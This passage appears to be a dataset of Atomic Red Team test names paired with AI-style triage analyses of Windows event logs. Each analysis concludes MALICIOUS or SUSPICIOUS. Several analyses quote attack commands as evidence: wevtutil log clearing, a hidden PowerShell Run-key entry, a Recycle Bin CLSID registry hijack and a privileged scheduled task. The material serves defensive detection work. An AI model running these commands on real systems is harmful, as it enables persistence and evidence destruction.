   - Conduct a comprehensive forensic analysis of the server.
   - Check for other signs of compromise or data exfiltration.

2. **Mitigation Measures**:
   - Identify and neutralize any malicious files or scripts present on the system.
   - Change passwords associated with affected accounts, specifically `admin_test`.
   - Review and strengthen security configurations and monitor for unusual activities.

3. **Long-term Strategies**:
   - Enhance logging and alerting mechanisms to detect similar activities in the future.
   - Consider conducting a security audit to find and resolve other possible attack vectors."
Remote Process Injection with Go using CreateRemoteThread WinAPI,"Upon reviewing the provided log entries from the Windows host, several activities stand out as potentially suspicious and indicative of malicious behavior:

1. **Event Log Clearing Activity**:
   - Multiple events (System, Security, and Windows PowerShell channels) being cleared by the user `admin_test` through the use of `wevtutil.exe` (a legitimate Windows utility for manipulating event logs). This is typically an intentional action to cover tracks and is common in post-exploitation scenarios where a malicious actor tries to erase traces of their activities.

2. **Suspicious PowerShell Activity**:
   - The PowerShell logs show a script execution involving `Start-Process` on `werfault.exe` and `CreateRemoteThread.exe`, which is a known technique associated with process injection (T1055 - Process Injection). The reference to `AtomicRedTeam` hints at a possible simulation or testing of a specific attack technique, but it should be noted that these activities can be leveraged for actual malicious purposes. The use of `CreateRemoteThread.exe` in particular is atypical and consistent with an attempt to execute code in the context of another process, potentially for malicious intents.

3. **Privilege Use and Escalation**:
   - The user `admin_test` obtaining multiple high-level privileges (SeDebugPrivilege, SeBackupPrivilege, etc.) indicates potential exploitation of privileges. Event ID 4672 in the Security logs confirms the assignment of these privileges upon logon.

4. **Time Manipulation**:
   - The Security and System logs indicate changes to the system time, which, while not inherently malicious, can be indicative of efforts to manipulate time for misattribution in log timestamps or timing attacks.

**Assessment**:
The combination of clearing event logs, suspicious PowerShell activity utilizing potentially malicious commands, high privilege use, and associated system manipulations strongly suggests a breach or malicious activity rather than benign misconfigurations or user actions.

**Conclusion**:
- **Resolution: MALICIOUS**

**Guidance and Next Steps**:
1. **Immediate Isolation**: Isolate the affected host to prevent further potential compromise or lateral movement within the network.
2. **Forensic Analysis**: Conduct a full forensic analysis on the host, including memory, disk, and further event log analysis to understand the scope of the compromise.
3. **Password Reset**: Reset credentials for `admin_test` and any other potentially compromised accounts.
4. **Review Security Controls**: Evaluate current security controls and logging configurations to ensure oversized logging and alerting on such suspicious activities in the future.
5. **Incident Response Plan**: Implement an incident response plan to handle and mitigate identified threats effectively.

In summary, the evidence points to malicious activity, warranting a thorough response and remediation effort."
Parent PID Spoofing - Spawn from svchost.exe,"### Analysis of the Windows Event Logs

**PowerShell Logs:**

1. **PowerShell EventIDs (600, 400, 403):** 
   - The command executed through PowerShell includes: 
     - **Get-CimInstance** to retrieve process information which by itself is legitimate.
     - **Start-ATHProcessUnderSpecificParent** to spawn a new PowerShell process with the command `-Command Start-Sleep 10`. While `Start-Sleep` is not inherently malicious, the command pipeline constructing it with `svchost.exe` process filtering could imply process injection or evasion techniques often utilized by malicious actors.
   - Another PowerShell call sets the ExecutionPolicy to Restricted and runs a custom script to search for a specific installation configuration. This type of behavior might denote an attempt to configure or inspect the system in a non-standard way. Though not immediately malicious, the combination of script execution and querying of system configurations is uncommon for standard administrative tasks.

**System Logs:**

1. **EventID 104 - Log File Cleared:** 
   - Multiple log files being cleared in close succession by a user named `admin_test`. Clearing logs is a classic tactic to cover tracks as part of malicious activity. Specifically, the clearing of Sysmon, System, and Security logs is suspicious and likely indicative of an intention to hide activities.

2. **Windows Update Activities (EventID 44):** 
   - Regular updates which seem legitimate and do not point towards malicious behavior.

**Security Logs:**

1. **EventID 1102 - Security Log Cleared:**
   - Similar to System Logs, the clearing of logs is suspicious and often indicative of malicious intent, especially when performed by a potentially compromised or malicious user account.
   
2. **EventID 4624 and 4672:**
   - These events indicate successful logon activities, and privileges exhibited are typical for SYSTEM-related operations. 

3. **EventID 5379 - Credential Validation Failures:**
   - While multiple credential validation failures exist, they don’t inherently suggest malicious activity without additional context about times and activities.

**Sysmon Logs:**

1. **EventID 1 & 5:**
   - Commands and utility executions like `wevtutil` indicate event log management operations. The use of `wevtutil` to clear logs confirms attempts to delete log evidence.
   - The frequent use of conhost, a console window host, alongside cleared logs via wevtutil, further aligns with obfuscation and clearing activities.

**Conclusion:**

The activities logged, namely the recursive log-clearing actions by `admin_test`, coupled with potentially evasive PowerShell usage, suggest a pattern often associated with malicious behaviors. While the logs showcase some benign system operations, the emphasis on log manipulation to obscure actions, particularly across security and system channels, signifies intent to hide illicit operations.

### Resolution: MALICIOUS

**Guidance:** 
- Immediately isolate the affected system to prevent further compromise.
- Conduct a thorough review of the user account activity associated with `admin_test` and audit access controls.
- Retain forensic evidence and engage incident response teams to analyze and contain the threat.
- Identify and address potential vulnerabilities that might have been leveraged by threats, like improperly applied security policies or unnecessary administrative privileges."
WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,"After analyzing the provided logs, the following suspicious and potentially malicious activities have been identified:

1. **Log Clearing Activity**:
    - Multiple instances of `wevtutil.exe` were used to clear event logs, as indicated by commands `cl Application`, `cl Security`, and `cl System`. This activity is logged in the `Sysmon` log and typically represents an attempt to cover tracks.
    - Security Event ID 1102 and System Event ID 104 both show that logs are being cleared by the user `admin_test`.

2. **Privilege Escalation Tool Execution**:
    - The Windows PowerShell log indicates the execution of a PowerShell script, `Get-WinlogonTokenSystem.ps1`, which is known for token manipulation, implying privilege escalation attempts.
    - This tool was executed using PowerShell with elevated privileges as seen from the command-line invocation in the Windows PowerShell and Sysmon logs.

3. **Unusual Command Execution**:
    - There are several instances of legitimate system utilities like `hostname.exe`, `whoami.exe`, and `conhost.exe` being executed. While these alone might be routine, in conjunction with the clearing of logs and execution of a well-known privilege escalation script, they add an element of suspicion.

4. **System Time Manipulation**:
    - Events with ID 4616 in the Security log indicate that the system time was changed, which could be used to alter timestamps and conceal malicious activity.

In conclusion, the activities captured in the provided logs indicate suspicious behavior with a high likelihood of malicious intent:
- The clearing of event logs is a strong indicator of an attempt to cover malicious actions.
- The execution of a known privilege escalation script signifies potential unauthorized privilege elevation attempts.
- While it is possible for legitimate administrators to perform log clearing and execute scripts, the context and timing (in conjunction with time manipulation) suggest these activities are out of routine operations.

**Assessment: MALICIOUS**

**Guidance**:
1. Immediately review user access policies and consider revoking or limiting access for the user `admin_test`.
2. Isolate the impacted host `Server002` to prevent further internal propagation.
3. Conduct a thorough investigation to identify any additional affected systems.
4. Preserve logs and related artifacts for forensic analysis.
5. Strengthen monitoring and alerting capabilities to detect similar activities in the future.
6. Consider re-imaging the impacted host to ensure complete removal of any unauthorized changes or software."
Domain Password Policy Check: Common Password Use,"### Detailed Analysis

**Suspicious and Anomalous Behaviors:**

1. **Event Logs Cleared:**
   - Multiple event logs, including System, Windows PowerShell, and Security, were cleared almost simultaneously, as indicated by Event ID 104 and Event ID 1102 in the System and Security logs respectively. 
   - The logs were cleared by a user called ""admin_test"" on Server002. Clearing event logs can be an indicator of malicious activity as attackers may clear logs to cover their tracks.

2. **Use of `wevtutil.exe`:**
   - There are multiple instances of the command-line utility `wevtutil.exe` being used to clear logs. The command executed was: `wevtutil.exe cl` followed by log names (e.g., `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, etc.).
   - A legitimate admin could clear logs, but this action is often associated with an attempt to remove evidence of malicious activity.

3. **PowerShell Activity:**
   - A PowerShell process was executed with a complex script aimed at credential manipulation. The script checks for a stored password, modifies it if needed, and saves it securely in a file, which could potentially be part of a credential theft scenario.
   - The involvement of `AtomicRedTeam` folder and environment variables suggests the use of simulated attack scenarios for detection or training purposes, which can be considered benign if done under controlled conditions, but should be verified.

4. **Process Executions:**
   - Consistent spawning of `conhost.exe` alongside `wevtutil.exe` may suggest obfuscation tactics or an attempt to conceal activity.
   - The execution of `whoami.exe` and `hostname.exe` in a close timeframe, especially in a context related to logs clearing, might indicate reconnaissance activities.

5. **Microsoft Edge Installation/Update:**
   - Multiple processes related to Microsoft Edge updates and installations are seen executing as `NT AUTHORITY\SYSTEM`. These activities generally are not suspicious if they correspond with known update schedules, but should be checked against deployment records to ensure they weren't leveraged as cover for unauthorized actions.

**Assessment:**

Based on the provided logs, there are definite indicators of **potential compromise**. The clearing of multiple event logs and the use of tools such as `wevtutil.exe` and PowerShell for potential credential manipulation are particularly concerning and align with common tactics used by attackers to hide their presence and gather intelligence. The suspicious activities surrounding these utilities and timing suggest more than just regular administrative maintenance.

**Resolution:**

**SUSPICIOUS:** The logs contain activity that doesn't look right and needs more investigation. The actions observed, particularly the clearing of multiple logs and unusual PowerShell command execution, warrant deeper investigation. Immediate steps should be taken to:

- **Verify** if the actions were authorized by communicating with the suspected user ""admin_test.""
- **Check** the scope of the PowerShell scripts run under the context of `admin_test` to determine if any sensitive information or credentials were exposed.
- **Secure** the environment by reviewing configurations and permissions for any anomalies and ensure monitoring solutions are verified for proper configurations.
- **Conduct** a thorough review or possibly a forensic investigation of the system(s) involved to determine the extent of any unauthorized access or changes made."
WMI Invoke-CimMethod Scheduled Task,"Upon analyzing the provided Windows event logs, I have identified a series of events that suggest potentially malicious activity, particularly indicative of log tampering and potentially malicious PowerShell activity. Here's a detailed breakdown:

1. **Log File Cleared Events (System Log Event ID 104)**
   - There are multiple event log clear operations conducted by the user ""admin_test"" on different channels (System and Windows PowerShell). Clearing event logs can be a sign of malicious behavior intended to erase traces of actions taken on the system.

2. **Multiple Instances of `wevtutil.exe` Execution (Sysmon Log Event ID 1)**
   - The process `wevtutil.exe` is observed multiple times clearing event logs for System, Windows PowerShell, Application, and Security channels. When executed persistently and in conjunction with cleared logs, it suggests an attempt to cover tracks.

3. **Suspicious PowerShell Activity (Sysmon Log and PowerShell Log)**
   - A PowerShell command (`Event ID 600`) is executed by user ""admin_test"" using a script that loads XML data from a temporary directory associated with the Atomic Red Team framework. This framework is often used for pen-testing and red team exercises, indicating potential misuse by an unauthorized actor for malicious purposes.
   - The command uses `Invoke-CimMethod` to register a scheduled task via WMI using the XML script. This is a well-known technique for persistence or task scheduling in a compromised environment.

4. **Unusual Time Change (Security Log Event ID 4616)**
   - There are events reflecting changes in the system time, which could be an attempt to affect timestamping of logs or processes as part of stealthy operations. 

5. **Elevation of Privileges (Security Log Event ID 4672)**
   - The user ""admin_test"" gains privileges associated with SeDebugPrivilege, among others. This privilege allows extensive access to system-level operations and typically is not required for standard operations.

6. **Event Log Cleared (Security Log Event ID 1102)**
   - The Security log has been cleared by ""admin_test,"" which is an exceptionally strong indicator of someone trying to hide their actions on the system, given that security logs are instrumental in forensic investigations.

### Assessment
The combination of these activities, especially the log file clears, suspicious PowerShell use, and privilege escalation, highly suggests an unauthorized or malicious act. They are well-known indicators commonly associated with compromise attempts, potentially indicating lateral movement or preparation for a further attack stage.

### Recommendation
Based on the evidence provided, I conclude that the findings are indeed **MALICIOUS**. It is critical to:

- **Immediately isolate the affected system** from the network to prevent further spread of potential attacks.
- **Conduct a thorough forensic analysis**, considering the likelihood of additional undiscovered threats within systems potentially impacted by this compromise.
- **Evaluate and update access controls and authentication policies** to ensure unauthorized users do not gain privileged access.
- **Inspect and repair all unauthorized configuration changes and log tampering** to restore system integrity and audit capabilities.
- **Implement monitoring and alerting** for events like log clearing, PowerShell script execution with suspicious content, and privilege escalations in the future. 

Prompt action by the incident response team will be essential to mitigate further risks and begin remediation procedures."
Azure AD - adding user to Azure AD role,"Upon reviewing the provided Windows event logs, here is a detailed analysis of the entries that stand out as potentially suspicious or indicative of malicious activity:

   - **Details:** There are events indicating the clearing of multiple event logs (Security, System, Windows PowerShell), executed by a user named `admin_test`. The clearing of logs is often an indicator of malicious activity as it may be an attempt to cover tracks after unauthorized actions.
   - **Assessment:** This is highly suspicious behavior, especially occurring across multiple log channels almost simultaneously.

2. **PowerShell Activity (PowerShell Event ID: 600, Sysmon Event ID: 1):**  
   - **Details:** There are logs showing the execution of PowerShell commands by `admin_test` using the `AzureAD` module to connect to Azure AD with credentials in scripts. The script attempts to add a user to a directory role. This type of activity is often related to privilege escalation or lateral movement in hybrid environments.
   - **Assessment:** While legitimate in certain organizational contexts, the combination with log clearing raises red flags for malicious intent.

3. **Usage of `wevtutil.exe` and `whoami.exe` (Sysmon Event IDs: 1, 5):**  
   - **Details:** The `wevtutil.exe` tool was used to clear logs, matching the log clearance events. Additionally, `hostname.exe` and `whoami.exe` are used, often indicative of reconnaissance.
   - **Assessment:** The specific usage of these utilities, especially `wevtutil.exe` to clear logs, is often associated with post-exploitation activities.

4. **System Integrity (Sysmon Integrity Levels):**  
   - The logs show that commands were executed at a high integrity level, suggesting administrative privileges were used during these operations.

Based on the activities observed, I assess the situation as follows:

- **Threats/Risks:** Unauthorized log manipulation and potential privilege escalation activities were likely attempted. The combination of clearing security-related logs and executing PowerShell scripts with possible administrative aims suggests a well-thought-out attack to potentially further compromise or hide malicious actions.
  
**Resolution: MALICIOUS**

SystemBC Malware-as-a-Service Registry,"**Analysis of Windows Event Logs:**

1. **Security Log Analysis:**
   - The first event shows Event ID 1102, indicating the security event log was cleared by the user ""admin_test"". This is a common tactic used by malicious actors to cover their tracks.
   - Event ID 4616 appears to be a legitimate system time change event performed by the ""LOCAL SERVICE"" account using `svchost.exe`.

2. **Application Log Analysis:**
   - The events related to ""edgeupdate"" indicate the service was stopped. These events on their own don't appear necessarily suspicious, but could be part of a larger context of activity.

3. **System Log Analysis:**
   - Similar to the security log, Event ID 104 also shows the system logs being cleared by ""admin_test"", which reinforces suspicion as this can be an attempt to hide tracks.
   - Several events related to time synchronization do not appear to have immediate malicious intent.

4. **Windows PowerShell Log Analysis:**
   - The PowerShell logs indicate a suspicious command was executed: setting a registry key with a hidden PowerShell execution designed to run a script in the background with a bypassed execution policy. This behavior is characteristic of persistence mechanisms used by malware.
   - Command: `Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File""` is particularly concerning, as it tries to obfuscate and ensure execution without user consent.

5. **Sysmon Log Analysis:**
   - Multiple instances of `wevtutil.exe` are observed being executed under the ""admin_test"" user to clear logs for various channels, which aligns with the log clearing observed in the Security and System logs.
   - There are processes like `hostname.exe` and `whoami.exe` executed, which are not inherently malicious but could be used for information gathering.
   - The presence of `MicrosoftEdgeUpdate.exe` processes with NT AUTHORITY\SYSTEM seems routine since those are part of automatic updates, although their timing around suspicious activity could be worth noting.

**Assessment:**

The logs contain clear indicators of potentially malicious activity, primarily due to the use of PowerShell for setting persistence, clearing of event logs by an admin user, and privilege misuse. The combination of these actions paints a picture of unauthorized or potentially harmful behavior on the system.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
- Conduct a thorough investigation to determine the origin and intent of the PowerShell scripts by examining related files or scripts on the system.
- Analyze the network activity to check for any signs of external communication, especially considering the command executed in the PowerShell logs.
- Audit the ""admin_test"" account for unauthorized access and consider it being compromised.
- Review security configurations and implement monitoring for PowerShell scripts with high privileges or using bypass execution policies.
- Reinforce logging and monitoring mechanisms to prevent future log tampering and aid in quicker detection of such activities."
Powershell Cmdlet Scheduled Task,"Upon analyzing the provided Windows event logs, there are several key observations and potential indicators of malicious activity:

1. **Event Log Clearing:**
   - Events with ID 1102 and 104 indicate that the Security, System, and PowerShell logs were cleared by a user named ""admin_test"" around 16:46 on 2024-10-22. Clearing event logs is often a tactic used by malicious actors to cover their tracks after performing unauthorized actions.

2. **Suspicious PowerShell Activity:**
   - The logs indicate the execution of a PowerShell script that aims to create a scheduled task to execute ""calc.exe"" with the highest privileges upon user logon. This behavior is suspicious and potentially malicious as it involves persistence mechanisms and privilege elevation (`New-ScheduledTaskPrincipal -GroupId ""BUILTIN\\Administrators"" -RunLevel Highest`).

3. **Wevtutil.exe Usage:**
   - Numerous Sysmon logs show the execution of `wevtutil.exe` to clear various event logs (Security, System, Application, and Windows PowerShell). The command used (`wevtutil.exe cl`) aligns with the event log clearing activity mentioned earlier. This is a common activity associated with attackers attempting to eliminate forensic evidence.

4. **Host Manipulation and Information Gathering:**
   - Other processes like `hostname.exe` and `whoami.exe` are run, which often indicates information gathering on the system to understand the environment and potentially identify system configuration or user details for further exploitation.

**Assessment:**
- The combination of event log clearing, suspicious use of PowerShell, and the creation of a potentially malicious scheduled task strongly suggests that there has been a compromise on the system. Given these findings, the activities cannot be considered benign.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**
1. **Isolate the Infected System:**
   - Immediately isolate this system from the network to prevent potential lateral movement by the attacker.

2. **Conduct a Thorough Investigation:**
   - Further analyze the system for other signs of compromise, such as unauthorized access to sensitive data, installation of additional malware, or communication with external command and control servers.

5. **Conduct a Full Security Audit:**
   - Assess the security and configuration of all systems and applications in the network to ensure they are protected against similar attacks.

6. **Review User Access and Permissions:**
   - Re-evaluate user permissions and access rights, especially for administrative accounts, to ensure the principle of least privilege is enforced.

7. **Communicate with Stakeholders:**
   - Inform necessary stakeholders and potentially prepare to notify users if sensitive data exposure is determined."
Suspicious bat file run from startup Folder,"Based on the analysis of the Windows event logs provided, the following points are worthy of note:

1. **Event Log Clearing**: 
   - Multiple event log clear operations were identified in both the Security event logs (Event ID 1102) and System logs (Event ID 104). The events were cleared by the user ""admin_test"" on ""SERVER002"". This is a significant indicator of potential malicious activity, especially if these actions were not part of regular maintenance. Clearing event logs is a common tactic used by threat actors to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - There is evidence of obfuscated or scripted PowerShell activity (Sysmon EventID 1, PowerShell logs). The PowerShell command involves copying a batch file named ""batstartup.bat"" to multiple startup directories and executing them, which is often used in attacks to establish persistence.
   - The use of PowerShell with a scripted input to alter or create files in startup directories is suspicious and can be indicative of attempts to maintain persistence across reboots.

3. **Use of Potentially Suspicious Commands**:
   - The frequent use of `whoami.exe` and `wevtutil.exe` could be indicative of privilege reconnaissance and manipulation of event logs respectively. While these can be part of legitimate administrative activity, their combination with other anomalies makes them worth further scrutiny.

4. **Time Change Events**:
   - Events show time manipulation. While these can occur legitimately (for instance, synchronization with NTP servers), when coupled with other suspicious behaviors, they may suggest an attempt to manipulate system time for malicious purposes.

### Assessment and Recommendation:
The provided logs suggest a high likelihood of malicious activity, primarily due to the event log clearing, suspicious PowerShell commands aimed at persistence, and time adjustments. 

**Resolution:** MALICIOUS

### Recommended Actions:
- **Immediate Isolation**: Isolate Server002 to prevent potential spread or further malicious activity.
- **Detailed Investigation**: Conduct a full forensic investigation on Server002 to determine the extent of the compromise and identify any other potentially affected systems.

- **Analyze Persistence Mechanisms**: Review any files and scripts placed in startup folders to understand their payload.
- **Audit and Strengthen Security**: Strengthen audit policies, ensure regular security monitoring, and implement multi-factor authentication to enhance system defenses.
- **User Education and Training**: Ensure users are aware of security policies and the importance of reporting suspicious activities.

Prompt action is necessary to control and contain the potential breach."
Add persistance via Recycle bin,"Upon reviewing the provided Windows event logs, I have identified a sequence of activities that suggests the presence of potentially malicious behavior, particularly with respect to the event log clearing and the suspicious command execution via the command line.

### Suspicious Activities Identified:

1. **Log Clearing Events (Security Log - Event ID 1102):**
   - An Event ID 1102 indicates that the security log was cleared by `SERVER002\admin_test`. This action is often indicative of an attempt to cover tracks after potentially malicious activities, especially when performed without a clear legitimate reason.

2. **Sysmon Event Entries:**
   - Multiple instances of the `wevtutil.exe` process being executed with the `/cl` (clear) command. This utility is used to clear event logs as evidenced by:
     - `CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""` 
     - `CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`
     - `CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`
   - This sequence of clearing logs suggests a deliberate action to remove traces of other potentially harmful activities. 

3. **Registry Modification via Command Line:**
   - Execution of `cmd.exe` with a command to modify the registry to open `calc.exe`:
     - `CommandLine"":""\""cmd.exe\"" /c reg ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f""`
   - This registry change is suspicious because it remaps the open command for a system class ID to execute the calculator, which could be used as proof of concept for privilege escalation or code execution.

### Normal Activities:

- Several activities involving `MicrosoftEdgeUpdate.exe` and related tasks seem to be benign system updates and maintenance, which are regular and expected activities executed under the `NT AUTHORITY\SYSTEM` account.

### Assessment and Conclusion:

Given the evidence from the logs, particularly the events surrounding log clearing and suspicious registry modifications, it appears that there is a reasonably strong indication of malicious activity or at least preparatory actions often associated with an attack. The combination of log clearing activities and suspicious registry changes is alarming and reflects patterns typically associated with attempts to obfuscate malicious actions.

### Resolution:
**MALICIOUS**

### Recommendations for Further Action:

1. **Immediate Response:**
   - Isolate the affected machine (`Server002`) to prevent potential lateral movement or further execution of malicious commands.
   - Conduct a thorough forensic analysis to identify any additional signs of intrusion or compromise not captured in the logs.

2. **Validation and Cleanup:**
   - Verify all users and processes that initiated suspicious activities, particularly focusing on any unauthorized access.
   - Revert any unauthorized registry changes and review system settings for other potentially dangerous modifications.

3. **Monitoring and Prevention:**
   - Implement or strengthen existing monitoring systems to catch unusual log activities early.
   - Educate users on secure handling and reporting of events, and review and audit administrative logins regularly.

Taking these steps will help to mitigate any immediate threats and fortify the affected system against similar incidents in the future."
Domain Password Policy Check: No Number in Password,"### Detailed Analysis of the Logs:

1. **System Log:**
   - The logs indicate multiple `EventID 104` entries which suggest the clearing of event logs by the user `admin_test`. Clearing event logs without a legitimate reason is a red flag and could indicate an attempt to cover up malicious activities.
   - Key events:
     - System log was cleared at `10:16:22.5189693`.
     - Windows PowerShell log was cleared at `10:16:22.6423546`.
     - Security log was cleared at `10:16:22.5704157` (event ID 1102).
   
2. **Windows PowerShell Log:**
   - The PowerShell log shows execution of a script dealing with credential management. The script attempts to change passwords and store them securely, but the context and purpose are suspicious.
   - The script checks for a credential file and validates password against a stored password string (""UpperLowerLong-special""). It catches errors specific to incorrect stored credentials, which could imply credential harvesting or tampering.
   - The usage of `Set-ADAccountPassword` implies privileged actions on Active Directory, unauthorized access or password changes may have security implications.

3. **Application Log:**
   - Contains a benign entry related to the Software Protection Platform Service, with nothing overtly suspicious indicating compromise.

4. **Security Log:**
   - Clearing of the security log (`Event ID 1102`) from the same user (`admin_test`) within the same time frame as the system and PowerShell logs were cleared corroborates the hypothesis of log tampering.

5. **Sysmon Log:**
   - Entries show a pattern of `wevtutil.exe` usage to clear various logs (`Sysmon`, `Application`, `Security`, `System`, and `Windows PowerShell`). This tool is often used to manipulate or clear event logs, supporting malicious activity.
   - The parent process `wsmprovhost.exe` - typically associated with Windows Remote Management, suggests remote access or manipulation.
   - **Indicators of compromise:**
     - `wevtutil.exe` command-line uses to clear logs.
     - `powershell.exe` activity that modifies credentials.
     - Suspect process activities with an `IntegrityLevel` set to `High`, suggesting elevated privileges.

### Assessment:
The logs reveal comprehensive evidence of activities consistent with a potential security breach:
- Repeated clearing of crucial logs such as `System`, `Security`, and `Windows PowerShell`.
- Execution of scripts related to credential management in PowerShell, which might be indicative of attempts to manipulate user accounts.
- Use of `wevtutil.exe` to clear logs, associated with malicious actions.
- The logs suggest attempts to hide activities through log clearing by the user `admin_test`.

### Threats or Risks:
- Unauthorized access or administration of user credentials.
- Tampering with security logs which may make detection of the attack harder.
- Potential privilege escalation or exploitation using administrative privileges.

### Guidance on How to Proceed:
- Immediate containment of the account involved (`admin_test`) by disabling the account or resetting passwords.
- Conduct a thorough investigation of all systems `Server002` has communicated with to trace any lateral movement.
- Audit logs from other systems for similar patterns around the same timeline.
- Ensure security patches and audit configurations are up-to-date to mitigate vulnerabilities.
- Consider deploying enhanced monitoring measures or a forensic analysis to assess any additional systems impacted.

### Resolution:
- **Resolution: MALICIOUS** - The logs indeed contain activities indicating malicious behavior, which require further immediate and comprehensive investigation. The actions observed align with common indicators of compromise."
Parent PID Spoofing - Spawn from New Process,"The provided logs from a Windows machine on ""Server002"" indicate potential suspicious and potentially malicious activity. Here is the detailed analysis of each log type:

### 1. Application Log
- The application log entry is related to the Software Protection Platform Service, which by itself is benign. It does not give us direct signs of malicious activity.

### 2. Security Log
- Event ID 1102 indicates that the security logs were cleared by a user named ""admin_test"". Clearing security logs is a high-indicator action typically used to hide traces of unauthorized or suspicious activity, suggesting malicious intent.

### 3. Windows PowerShell Log
- The PowerShell logs show the execution of a command using `powershell.exe` with unusual command-line arguments `Start-Process -FilePath $Env:windir\\System32\\notepad.exe`. There is also mention of a custom extension `Start-ATHProcessUnderSpecificParent`, which is not native to PowerShell and could indicate obfuscated or customized script execution. This could strongly suggest an attempt to execute code with user privileges and potentially conceal activity.

### 4. System Log
- Logs indicate the clearing of both System and Windows PowerShell logs by the same user ""admin_test"". This further corroborates the attempt to hide malicious actions or activities.

### 5. Sysmon Log
- Sysmon logs display the execution of `wevtutil.exe` with the command-line `cl` to clear logs for different categories including `Sysmon/Operational`, `Application`, `System`, and Security. The clearing of logs across multiple systems by ""admin_test"" suggests an attempt to erase evidence of unauthorized activity.
- Multiple executions of `conhost.exe`, `wevtutil.exe`, and inquiries using utilities like `whoami.exe` and `hostname.exe`, observed in Sysmon logs, are commonplace for gathering information on the system and potentially altering logging configurations. This chain of behavior when combined with other actions (like log clearing) can indicate malicious activity.

### Assessment and Resolution
- **Resolution: MALICIOUS**

The logs from ""Server002"" strongly indicate that ""admin_test"" may have been engaged in suspicious and malicious activities, including potentially unauthorized system access or privilege escalation, clearing of important event logs to hide activities, and executing potentially harmful or obfuscated PowerShell commands.

### Recommendations
1. **Immediate Actions:**
   - Isolate the affected host (""Server002"") to prevent further activity or potential spread of malicious actions.
   - Perform a full investigation on the user ""admin_test"" to determine the legitimacy of actions and account compromise.
   - Conduct endpoint scans to identify any malware or unauthorized tools/scripts present.
   - Review and enhance security logging and monitoring to prevent log tampering.

2. **Further Analysis:**
   - Consider capturing a memory dump for further analysis on potentially running malicious processes.
   - Investigate other machines within the network to ensure the activity hasn't spread.

3. **Preventive Measures:**
   - Implement better access controls and user activity monitoring, especially for accounts with administrative privileges.
   - Regularly back up logs and monitor for any signs of clearing or tampering with logs."
Winlogon Notify Key Logon Persistence - PowerShell,"Upon analyzing the provided Windows event logs, several points of interest suggest potential suspicious activity:

### Windows PowerShell Logs:
1. **PowerShell Command Execution**: There are multiple PowerShell event logs indicating the execution of a script that manipulates registry entries under `""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam""`. This behavior is typically associated with persistence mechanisms or attacks meant to maintain persistence on a system using registry keys.
   - The script sets DLL properties and impersonation rights, which can be indicative of a privilege escalation attempt or a persistence method.

### Security Logs:
1. **Event Log Clearing**: An event with ID `1102` shows that the security logs were cleared by a process (process ID `3704` executed by user `admin_test`). Clearing logs is often a technique used by malicious actors to cover their tracks after executing unauthorized activities.

### Sysmon Logs:
1. **Wevtutil.exe Execution**: Several instances of `wevtutil.exe` were used to clear event logs (indicated by the command line `cl Application`, `cl System`, `cl Security`, and `cl Microsoft-Windows-Sysmon/Operational`). This activity aligns with the `1102` event from the security log and strongly suggests an attempt to cover up previously executed actions.
2. **High Integrity Level Execution**: The commands executed are marked with high integrity level (`High`), suggesting they were run with elevated privileges, which aligns with potential unauthorized system-level access.
3. **Time Synchronization**: There are security events indicating minor time adjustments which seem to be normal for time synchronization services but it is worth cross-verifying timestamps to ensure no tampering.

### System and Application Logs:
- **Event Logs** were cleared for both `System` and `Windows PowerShell` channels, further corroborating the log-clearing activity.

### Overall Assessment:
The combination of registry manipulation through PowerShell, the clearing of multiple event logs (Security, System, and Application), and the use of high privilege processes strongly suggests malicious intent. This series of activities is consistent with tactics often employed in the initial setup of persistent backdoors or post-exploitation cleanup.

### Resolution:
- **MALICIOUS**: The observed activities, particularly registry manipulation for potential persistence and multiple log-clearing actions, strongly suggest malicious activity. Immediate investigation, system isolation, and further forensic analysis are recommended to determine the full extent of the compromise, followed by remediation steps to secure the system and prevent future incidents."
Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"After a thorough analysis of the provided logs, the following points indicate suspicious and potentially malicious activity:

1. **Event Log Clearing**: The logs show instances where the event logs (System, Security, and Windows PowerShell) were cleared. Specifically:
   - EventID 104 in the System logs indicates a log file being cleared by the user `admin_test`.
   - EventID 1102 in the Security logs indicates the Security log was cleared. Clearing event logs is a common tactic to cover tracks after malicious activity to avoid detection.

2. **PowerShell Command Execution**: There are PowerShell commands executed that perform the following tasks:
   - Importing modules such as MSOnline and AzureAD.
   - Using credentials `jonh@contoso.com` and resetting the password of a target user in Azure Active Directory.
   - Adding a user to privileged roles like ""Company Administrator"" and ""Global Reader"".
   - Such commands are indicative of privilege escalation attempts and unauthorized activities within an Azure environment.

3. **Suspicious Process Activity**: 
   - The `CompatTelRunner.exe` process (Microsoft Compatibility Telemetry) is listed as the caller for a series of suspicious activities (EventID 4798 and 4799 in the Security logs). This is unusual as it typically shouldn't be involved in these actions. The process was querying security groups and users, which could point to reconnaissance activity.

4. **Use of Cmdlets for Credential Manipulation and Role Changes**:
   - The use of PowerShell scripts to connect to Azure services and manipulate user roles suggests a sophisticated attempt at gaining and elevating access within a cloud environment.

Given these findings, the behavior observed in the logs is highly indicative of malicious activity. The actions taken, such as clearing event logs, running potentially harmful PowerShell scripts, and interacting with sensitive Azure data and roles, align with tactics used in cyberattacks.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected host from the network to prevent further unauthorized access or data exfiltration.
- Reset credentials for the affected user accounts and implement stricter password policies.
- Review and audit all Azure AD and administrative account activities to identify and address any unauthorized changes.
- Conduct a comprehensive forensic analysis to understand the full scope of the intrusion and identify any additional compromised systems or data.
- Strengthen logging and monitoring to detect and respond to similar incidents proactively in the future. Enable alerting for log clearing and monitor PowerShell execution policies closely."
Modify Service to Run Arbitrary Binary (Powershell),"Upon detailed analysis of the provided logs, I have identified several indicators of potential malicious activity:

1. **PowerShell Logs**:
